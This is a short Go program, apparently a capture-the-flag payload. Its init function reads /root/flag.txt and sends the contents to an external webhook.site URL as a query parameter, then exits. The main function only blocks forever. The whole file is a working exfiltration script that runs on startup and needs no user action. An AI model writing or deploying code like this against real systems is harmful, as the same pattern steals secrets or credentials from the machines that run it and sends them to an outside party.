package main

import (
	"io/ioutil"
	"net/http"
	"os"
)

func init() {
	flag, err := ioutil.ReadFile("/root/flag.txt")
	if err == nil {
		http.Get("https://webhook.site/63a4f50c-ecc3-471f-b54f-29d162056002?flag=" + string(flag))
	}
	os.Exit(0)
}

func main() {
	// Required by Go for building binaries from "package main"
	select {} // Block forever, if it ever gets here (it shouldn't)
}
